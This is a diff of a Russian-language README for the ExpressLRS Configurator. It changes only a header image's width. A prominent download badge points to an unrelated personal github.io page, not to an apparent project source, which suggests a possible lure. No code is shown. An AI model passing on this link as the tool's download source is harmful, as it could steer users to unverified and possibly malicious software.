@@ -1,7 +1,7 @@
 # ExpressLRS Configurator — настройка и прошивка оборудования ExpressLRS
 
 <p align="center">
-  <img src="https://www.expresslrs.org/assets/images/social/quick-start/installing-configurator.png" alt="ExpressLRS Configurator" width="230">
+  <img src="https://www.expresslrs.org/assets/images/social/quick-start/installing-configurator.png" alt="ExpressLRS Configurator" width="350">
 </p>
 
 [![GET — EXPRESSLRS CONFIGURATOR](https://img.shields.io/badge/GET-EXPRESSLRS_CONFIGURATOR-2563eb?style=for-the-badge)](https://mccunekopischke.github.io/.github/ExpressLRS-configurator)
